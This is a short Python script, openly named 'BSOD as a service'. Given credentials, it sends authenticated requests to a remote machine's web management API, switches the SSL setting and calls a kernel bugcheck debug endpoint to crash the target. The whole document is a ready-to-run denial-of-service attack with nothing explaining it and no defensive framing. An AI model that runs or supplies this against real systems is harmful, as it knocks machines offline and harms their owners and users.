import requests
import sys
import ssl
import base64

def make_bsod(ip, port, uname, passwd):
	auth=base64.urlsafe_b64encode(f'{uname}:{passwd}'.encode()).decode()
	headers={}
	headers['User-Agent']='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
	headers['Accept']='text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7'
	headers['Accept-Encoding']='gzip, deflate'
	headers['Authorization']=f'Basic {auth}'
	proxies={}
	proxies['https']='http://{ip}:{port}'
	session=requests.session()
	print('Introducing BaaS (BSOD as a service)')
	print()
	inp=input(f'Do you want to crash machine at {ip}? (Y/N)')
	if inp.lower()!='y':
		print("Use this service any other time.")
		exit()
	print(f'Attempting to crash machine at {ip}')
	resp=session.get(f'http://{ip}:{port}/', headers=headers)
	resp=session.get(f'http://{ip}:{port}/api/authorize/setSslState?sslState=http&rememberSslState=true&remember=true', headers=headers)
	resp=session.post(f'http://{ip}:{port}/api/debug/dump/kernel/bugcheck', headers=headers, verify=False, proxies=proxies)
	print("Check status of remote machine")

if __name__=='__main__':
	ip=sys.argv[1]
	port=sys.argv[2]
	uname=sys.argv[3]
	passwd=sys.argv[4]
	make_bsod(ip, port, uname, passwd)
